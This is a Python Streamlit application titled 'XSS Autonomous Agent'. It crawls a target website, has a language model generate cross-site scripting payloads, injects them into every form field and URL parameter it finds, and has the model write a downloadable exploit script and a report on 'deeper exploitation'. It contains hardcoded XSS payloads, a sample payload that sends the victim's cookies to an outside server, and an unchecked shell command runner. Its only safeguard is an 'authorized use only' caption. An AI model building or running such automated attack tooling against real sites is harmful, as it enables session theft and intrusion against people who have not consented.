import streamlit as st
import os
import subprocess
import requests
import re
import urllib.parse
import json
import time
import threading
import queue
from openai import OpenAI
from bs4 import BeautifulSoup
from collections import deque
from datetime import datetime

st.set_page_config(
    page_title="XSS Autonomous Agent",
    page_icon="🕷️",
    layout="wide",
    initial_sidebar_state="collapsed",
)

# ── Constants ────────────────────────────────────────────────────────────────
MODEL = "deepseek/deepseek-r1"
BASE_URL = "https://openrouter.ai/api/v1"
MAX_TOKENS = 1500
MAX_CRAWL_DEPTH = 3
MAX_PAGES = 40
REQUEST_TIMEOUT = 10
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
}

# ── Session state ─────────────────────────────────────────────────────────────
defaults = {
    "log": [],
    "findings": [],
    "running": False,
    "done": False,
    "pages_crawled": 0,
    "points_found": 0,
    "vulns_found": 0,
    "exploit_code": "",
}
for k, v in defaults.items():
    if k not in st.session_state:
        st.session_state[k] = v

# ── Helpers ───────────────────────────────────────────────────────────────────

def get_client():
    key = os.environ.get("OPENROUTER_API_KEY", "")
    if not key:
        st.error("OPENROUTER_API_KEY not set in Replit Secrets.")
        st.stop()
    return OpenAI(api_key=key, base_url=BASE_URL)


def ts():
    return datetime.now().strftime("%H:%M:%S")


def log(msg: str, kind: str = "info"):
    icons = {"info": "▸", "ok": "✅", "warn": "⚠️", "vuln": "🚨", "ai": "🤖", "cmd": "⚙️"}
    prefix = icons.get(kind, "▸")
    st.session_state.log.append(f"[{ts()}] {prefix} {msg}")


def safe_get(url: str, **kwargs) -> requests.Response | None:
    try:
        return requests.get(url, headers=HEADERS, timeout=REQUEST_TIMEOUT,
                            allow_redirects=True, **kwargs)
    except Exception:
        return None


def same_origin(base: str, url: str) -> bool:
    try:
        b = urllib.parse.urlparse(base)
        u = urllib.parse.urlparse(url)
        return b.netloc == u.netloc
    except Exception:
        return False


def absolute(base: str, href: str) -> str | None:
    try:
        url = urllib.parse.urljoin(base, href)
        parsed = urllib.parse.urlparse(url)
        if parsed.scheme in ("http", "https") and parsed.netloc:
            return url
    except Exception:
        pass
    return None


# ── Phase 1: Crawl ────────────────────────────────────────────────────────────

def crawl(target: str) -> list[dict]:
    """BFS crawl — returns list of {url, html, forms, params}."""
    visited = set()
    queue_urls = deque([(target, 0)])
    pages = []
    base_origin = urllib.parse.urlparse(target).netloc

    while queue_urls and len(pages) < MAX_PAGES:
        url, depth = queue_urls.popleft()
        norm = url.split("#")[0].rstrip("/")
        if norm in visited:
            continue
        visited.add(norm)

        resp = safe_get(url)
        if not resp or "text/html" not in resp.headers.get("Content-Type", ""):
            continue

        soup = BeautifulSoup(resp.text, "html.parser")
        forms = extract_forms(url, soup)
        params = extract_url_params(url)

        pages.append({
            "url": url,
            "html": resp.text[:12000],
            "status": resp.status_code,
            "headers": dict(resp.headers),
            "forms": forms,
            "params": params,
        })
        log(f"Crawled [{len(pages)}/{MAX_PAGES}]: {url}", "cmd")
        st.session_state.pages_crawled = len(pages)

        if depth < MAX_CRAWL_DEPTH:
            for tag in soup.find_all("a", href=True):
                href = tag["href"]
                next_url = absolute(url, href)
                if next_url and same_origin(target, next_url):
                    norm_next = next_url.split("#")[0].rstrip("/")
                    if norm_next not in visited:
                        queue_urls.append((next_url, depth + 1))

    return pages


def extract_forms(page_url: str, soup: BeautifulSoup) -> list[dict]:
    forms = []
    for form in soup.find_all("form"):
        action = form.get("action", "")
        method = form.get("method", "get").lower()
        action_url = absolute(page_url, action) if action else page_url
        fields = []
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name") or inp.get("id") or ""
            itype = inp.get("type", "text")
            if name and itype not in ("submit", "button", "image", "file", "hidden"):
                fields.append({"name": name, "type": itype})
        if fields and action_url:
            forms.append({"action": action_url, "method": method, "fields": fields})
    return forms


def extract_url_params(url: str) -> list[str]:
    parsed = urllib.parse.urlparse(url)
    return list(urllib.parse.parse_qs(parsed.query).keys())


# ── Phase 2: AI generates payloads ────────────────────────────────────────────

def ai_generate_payloads(client: OpenAI, target: str, user_payload: str,
                          context_snippet: str) -> list[str]:
    """Ask the AI to craft context-aware XSS/HTML injection payloads."""
    prompt = f"""You are an offensive security expert generating XSS and HTML injection test payloads.

Target: {target}
User-specified injection content: {user_payload}
Context (relevant HTML/JS around the injection point):
{context_snippet[:2000]}

Generate 10 payloads that are likely to succeed given this specific context.
Include:
- Basic XSS variants
- Attribute injection variants
- DOM-based variants  
- Event handler variants
- Encoded variants (HTML entities, URL encoding, unicode)
- The user-specified payload adapted to this context

Output ONLY a JSON array of payload strings, nothing else. Example:
["<script>alert(1)</script>", "...", "..."]"""

    try:
        resp = client.chat.completions.create(
            model=MODEL,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=600,
            temperature=0.4,
        )
        text = resp.choices[0].message.content.strip()
        text = re.sub(r"```json|```", "", text).strip()
        match = re.search(r"\[.*\]", text, re.DOTALL)
        if match:
            return json.loads(match.group())
    except Exception as e:
        log(f"AI payload gen error: {e}", "warn")

    # Fallback payloads
    return [
        user_payload,
        f'<script>alert("XSS")</script>',
        f'"><script>alert(1)</script>',
        f"'><img src=x onerror=alert(1)>",
        f'<svg onload=alert(1)>',
        f'<iframe srcdoc="<script>alert(1)</script>">',
        f'javascript:alert(1)',
        f'<body onload=alert(1)>',
        f'{{{{7*7}}}}',
        f'${{{user_payload}}}',
    ]


# ── Phase 3: Test injection points ────────────────────────────────────────────

def test_reflection(url: str, param: str, payload: str, method: str = "get") -> dict:
    """Test if payload reflects unescaped in the response."""
    result = {
        "url": url, "param": param, "payload": payload,
        "method": method, "status": None, "reflected": False,
        "escaped": False, "body_snippet": ""
    }
    try:
        if method == "get":
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            params[param] = payload
            test_url = parsed._replace(query=urllib.parse.urlencode(params)).geturl()
            resp = requests.get(test_url, headers=HEADERS, timeout=REQUEST_TIMEOUT,
                                allow_redirects=True)
        else:
            resp = requests.post(url, data={param: payload}, headers=HEADERS,
                                 timeout=REQUEST_TIMEOUT, allow_redirects=True)

        result["status"] = resp.status_code
        body = resp.text

        # Check raw reflection
        if payload in body:
            result["reflected"] = True
            # Check if it's escaped
            escaped_variants = [
                payload.replace("<", "&lt;").replace(">", "&gt;"),
                payload.replace('"', "&quot;"),
                urllib.parse.quote(payload),
            ]
            if any(v in body for v in escaped_variants):
                result["escaped"] = True

            # Grab snippet around reflection
            idx = body.find(payload)
            result["body_snippet"] = body[max(0, idx - 100):idx + 200]

    except Exception as e:
        result["error"] = str(e)

    return result


def test_form(form: dict, payloads: list[str]) -> list[dict]:
    """Test all fields in a form with all payloads."""
    hits = []
    for field in form.get("fields", []):
        for payload in payloads[:5]:  # cap per field to save time
            r = test_reflection(form["action"], field["name"], payload, form["method"])
            if r["reflected"] and not r["escaped"]:
                hits.append(r)
                log(f"🚨 UNESCAPED REFLECTION: {form['action']} field={field['name']}", "vuln")
            elif r["reflected"]:
                log(f"Escaped reflection at {form['action']} field={field['name']}", "warn")
    return hits


def test_url_params(page: dict, payloads: list[str]) -> list[dict]:
    """Test all URL params of a page."""
    hits = []
    for param in page.get("params", []):
        for payload in payloads[:5]:
            r = test_reflection(page["url"], param, payload, "get")
            if r["reflected"] and not r["escaped"]:
                hits.append(r)
                log(f"🚨 UNESCAPED REFLECTION: {page['url']} param={param}", "vuln")
    return hits


# ── Phase 4: AI writes exploit + report ──────────────────────────────────────

def ai_write_exploit(client: OpenAI, findings: list[dict], target: str) -> str:
    if not findings:
        return ""

    sample = findings[0]
    prompt = f"""You are a penetration tester writing a minimal proof-of-concept exploit.

Target: {target}
Vulnerable endpoint: {sample['url']}
Injection parameter: {sample['param']}
Working payload: {sample['payload']}
Method: {sample['method']}
Response snippet: {sample.get('body_snippet', '')[:500]}

Write a short Python script (using requests) that exploits this XSS vulnerability.
The script should send the payload and verify it's reflected.
Include comments explaining each step.
Output ONLY the Python code."""

    try:
        resp = client.chat.completions.create(
            model=MODEL,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=MAX_TOKENS,
            temperature=0.2,
        )
        code = resp.choices[0].message.content.strip()
        code = re.sub(r"```python|```", "", code).strip()
        return code
    except Exception as e:
        return f"# Error generating exploit: {e}"


def ai_full_report(client: OpenAI, findings: list[dict], pages: list[dict],
                   target: str) -> str:
    if not findings:
        no_vuln_prompt = f"""You are a security researcher who just completed a crawl and XSS test of {target}.
No unescaped reflections were found with standard payloads, but here are potential attack surfaces discovered:

Pages crawled: {len(pages)}
Forms found: {sum(len(p['forms']) for p in pages)}
URL params found: {sum(len(p['params']) for p in pages)}

Page list: {[p['url'] for p in pages[:10]]}

Based on this surface area, suggest:
1. What manual tests to run next (blind XSS, stored XSS via forms, DOM-based XSS)
2. What specific payloads to try
3. What headers to check (CSP, X-Frame-Options, etc.)
4. Any suspicious patterns you'd investigate further

Be specific and actionable."""
        try:
            resp = client.chat.completions.create(
                model=MODEL,
                messages=[{"role": "user", "content": no_vuln_prompt}],
                max_tokens=MAX_TOKENS,
                temperature=0.3,
            )
            return resp.choices[0].message.content
        except Exception as e:
            return f"Error: {e}"

    findings_summary = json.dumps([{
        "url": f["url"], "param": f["param"], "payload": f["payload"],
        "method": f["method"], "snippet": f.get("body_snippet", "")[:200]
    } for f in findings[:8]], indent=2)

    prompt = f"""You are a senior penetration tester. Write a professional security report.

Target: {target}
Confirmed unescaped XSS/HTML injection findings:
{findings_summary}

Write:
## Executive Summary
## Findings (one section per unique vulnerability, with severity, CVSS, description, PoC steps)
## Remediation Recommendations
## Next Steps for Deeper Exploitation

Be technical, precise, and actionable."""

    try:
        resp = client.chat.completions.create(
            model=MODEL,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=MAX_TOKENS,
            temperature=0.2,
        )
        return resp.choices[0].message.content
    except Exception as e:
        return f"Error generating report: {e}"


# ── Phase 5: Header / CSP analysis ───────────────────────────────────────────

def analyze_headers(headers: dict) -> list[str]:
    issues = []
    checks = {
        "Content-Security-Policy": "Missing CSP header — no XSS policy enforced.",
        "X-XSS-Protection": "Missing X-XSS-Protection (legacy browsers at risk).",
        "X-Content-Type-Options": "Missing X-Content-Type-Options — MIME sniffing possible.",
        "X-Frame-Options": "Missing X-Frame-Options — clickjacking risk.",
        "Strict-Transport-Security": "Missing HSTS header.",
    }
    for header, msg in checks.items():
        if header.lower() not in {k.lower() for k in headers}:
            issues.append(msg)
    csp = {k: v for k, v in headers.items() if k.lower() == "content-security-policy"}
    if csp:
        csp_val = list(csp.values())[0]
        if "unsafe-inline" in csp_val:
            issues.append("CSP contains 'unsafe-inline' — inline scripts allowed, XSS protection weakened.")
        if "unsafe-eval" in csp_val:
            issues.append("CSP contains 'unsafe-eval' — eval() allowed, DOM-based XSS possible.")
        if "*" in csp_val:
            issues.append("CSP uses wildcard '*' — overly permissive, bypasses source restrictions.")
    return issues


# ── Main agent runner ─────────────────────────────────────────────────────────

def run_agent(target: str, user_payload: str):
    client = get_client()
    st.session_state.log = []
    st.session_state.findings = []
    st.session_state.exploit_code = ""
    st.session_state.pages_crawled = 0
    st.session_state.points_found = 0
    st.session_state.vulns_found = 0

    log(f"Target: {target}", "info")
    log(f"Injection content: {user_payload}", "info")
    log("━━━━━━━━ PHASE 1: RECONNAISSANCE & CRAWL ━━━━━━━━", "info")

    pages = crawl(target)
    log(f"Crawl complete — {len(pages)} pages, "
        f"{sum(len(p['forms']) for p in pages)} forms, "
        f"{sum(len(p['params']) for p in pages)} URL params", "ok")

    # Analyze headers from first page
    if pages:
        header_issues = analyze_headers(pages[0]["headers"])
        if header_issues:
            log("━━━━━━━━ HEADER ANALYSIS ━━━━━━━━", "info")
            for issue in header_issues:
                log(issue, "warn")

    log("━━━━━━━━ PHASE 2: AI PAYLOAD GENERATION ━━━━━━━━", "ai")

    # Build context snippet from most interesting pages
    context = ""
    for p in pages[:5]:
        if p["forms"] or p["params"]:
            context += f"\nPage: {p['url']}\n{p['html'][:1000]}\n"

    payloads = ai_generate_payloads(client, target, user_payload, context)
    log(f"Generated {len(payloads)} custom payloads for this target", "ai")
    for i, pl in enumerate(payloads[:5], 1):
        log(f"  Payload {i}: {pl[:80]}", "cmd")

    log("━━━━━━━━ PHASE 3: INJECTION TESTING ━━━━━━━━", "info")

    all_findings = []
    total_points = 0

    for page in pages:
        # Test URL params
        if page["params"]:
            total_points += len(page["params"])
            hits = test_url_params(page, payloads)
            all_findings.extend(hits)

        # Test forms
        for form in page.get("forms", []):
            total_points += len(form.get("fields", []))
            hits = test_form(form, payloads)
            all_findings.extend(hits)

    st.session_state.points_found = total_points
    st.session_state.vulns_found = len(all_findings)
    st.session_state.findings = all_findings

    log(f"Tested {total_points} injection points across {len(pages)} pages", "ok")

    if all_findings:
        log(f"🚨 {len(all_findings)} UNESCAPED INJECTION POINT(S) CONFIRMED", "vuln")
        log("━━━━━━━━ PHASE 4: EXPLOIT GENERATION ━━━━━━━━", "ai")
        log("Writing custom exploit script...", "ai")
        exploit = ai_write_exploit(client, all_findings, target)
        st.session_state.exploit_code = exploit
        log("Exploit script generated", "ok")
    else:
        log("No direct unescaped reflections found — checking for blind/stored vectors...", "warn")

    log("━━━━━━━━ PHASE 5: AI SECURITY REPORT ━━━━━━━━", "ai")
    log("Generating full security report...", "ai")
    report = ai_full_report(client, all_findings, pages, target)
    st.session_state.report = report
    log("Report complete.", "ok")
    log("━━━━━━━━ SCAN COMPLETE ━━━━━━━━", "ok")
    st.session_state.done = True
    st.session_state.running = False


# ── UI ────────────────────────────────────────────────────────────────────────

st.markdown("""
<style>
.terminal {
    background: #0d1117;
    color: #39ff14;
    font-family: 'Courier New', monospace;
    font-size: 13px;
    padding: 16px;
    border-radius: 8px;
    height: 420px;
    overflow-y: auto;
    white-space: pre-wrap;
    border: 1px solid #238636;
}
.metric-box {
    background: #161b22;
    border: 1px solid #30363d;
    border-radius: 8px;
    padding: 12px;
    text-align: center;
}
</style>
""", unsafe_allow_html=True)

st.title("🕷️ XSS Autonomous Agent")
st.caption("Authorized use only — only target systems you own or have written permission to test.")

# ── Mission config ────────────────────────────────────────────────────────────
with st.container(border=True):
    st.subheader("🎯 Mission Configuration")
    col1, col2 = st.columns([3, 2])
    with col1:
        target_url = st.text_input(
            "Target URL",
            placeholder="https://your-test-site.com",
            help="The site the agent will crawl and attack"
        )
    with col2:
        max_depth = st.slider("Crawl depth", 1, 4, 2)

    user_payload = st.text_area(
        "What to inject / test",
        placeholder='e.g.  <script>alert("owned")</script>   or   <img src=x onerror=fetch("https://myserver.com/?c="+document.cookie)>',
        height=80,
        help="The AI will adapt this and generate variants for each injection context found"
    )

    col_a, col_b, col_c = st.columns([2, 2, 3])
    with col_a:
        start_btn = st.button("🚀 Launch Agent", type="primary", use_container_width=True,
                              disabled=st.session_state.running)
    with col_b:
        if st.button("🗑️ Reset", use_container_width=True):
            for k, v in defaults.items():
                st.session_state[k] = v
            if "report" in st.session_state:
                del st.session_state["report"]
            st.rerun()

# ── Stats row ─────────────────────────────────────────────────────────────────
s1, s2, s3, s4 = st.columns(4)
s1.metric("Pages crawled", st.session_state.pages_crawled)
s2.metric("Injection points tested", st.session_state.points_found)
s3.metric("Vulnerabilities found", st.session_state.vulns_found,
          delta="🚨" if st.session_state.vulns_found > 0 else None)
s4.metric("Status",
          "🟢 Running" if st.session_state.running
          else ("✅ Done" if st.session_state.done else "⏸ Idle"))

# ── Live terminal ─────────────────────────────────────────────────────────────
st.subheader("💻 Agent Terminal")
terminal_placeholder = st.empty()

log_text = "\n".join(st.session_state.log) if st.session_state.log else "Waiting for mission launch..."
terminal_placeholder.markdown(
    f'<div class="terminal">{log_text}</div>',
    unsafe_allow_html=True
)

# ── Tabs for results ──────────────────────────────────────────────────────────
tab1, tab2, tab3 = st.tabs(["📊 Findings", "💻 Exploit Code", "🔍 Manual Terminal"])

with tab1:
    if st.session_state.findings:
        st.error(f"🚨 {len(st.session_state.findings)} confirmed injection point(s)")
        for i, f in enumerate(st.session_state.findings, 1):
            with st.expander(f"Finding #{i} — {f['url']} [{f['param']}]", expanded=i == 1):
                st.code(f["payload"], language="html")
                st.markdown(f"**URL:** `{f['url']}`  \n**Parameter:** `{f['param']}`  \n**Method:** `{f['method'].upper()}`  \n**HTTP Status:** `{f.get('status', 'N/A')}`")
                if f.get("body_snippet"):
                    st.markdown("**Response snippet:**")
                    st.code(f["body_snippet"], language="html")
    elif st.session_state.done:
        st.info("No direct unescaped reflections found. See the AI report in the terminal log for next steps.")
    else:
        st.info("Run the agent to see findings here.")

    if hasattr(st.session_state, "report") or "report" in st.session_state:
        report = st.session_state.get("report", "")
        if report:
            st.divider()
            st.subheader("📝 AI Security Report")
            st.markdown(report)

with tab2:
    if st.session_state.exploit_code:
        st.subheader("🔧 Generated Exploit Script")
        st.caption("AI-written Python exploit for the confirmed vulnerability")
        st.code(st.session_state.exploit_code, language="python")
        st.download_button("⬇️ Download exploit.py", st.session_state.exploit_code,
                           file_name="exploit.py", mime="text/plain")
    else:
        st.info("Exploit code will appear here after a confirmed vulnerability is found.")

with tab3:
    st.subheader("Manual Command Runner")
    st.caption("Run raw commands — curl, nmap, whatweb, nikto, etc.")
    manual_cmd = st.text_input("Command", placeholder="curl -sI https://target.com | head -30")
    if st.button("▶ Run", type="secondary") and manual_cmd.strip():
        with st.spinner("Running..."):
            try:
                result = subprocess.run(
                    manual_cmd, shell=True, capture_output=True,
                    text=True, timeout=30
                )
                out = (result.stdout + result.stderr).strip() or "(no output)"
            except subprocess.TimeoutExpired:
                out = "[TIMEOUT after 30s]"
            except Exception as e:
                out = f"[ERROR] {e}"
        st.code(out, language="bash")

# ── Launch agent ──────────────────────────────────────────────────────────────
if start_btn:
    if not target_url.strip():
        st.warning("Enter a target URL first.")
    elif not user_payload.strip():
        st.warning("Enter what you want to inject.")
    else:
        MAX_CRAWL_DEPTH = max_depth
        st.session_state.running = True
        st.session_state.done = False
        st.rerun()

# Run the agent synchronously when running == True and not done
if st.session_state.running and not st.session_state.done:
    run_agent(target_url.strip() or st.session_state.get("_last_target", ""),
              user_payload.strip() or st.session_state.get("_last_payload", ""))
    st.rerun()
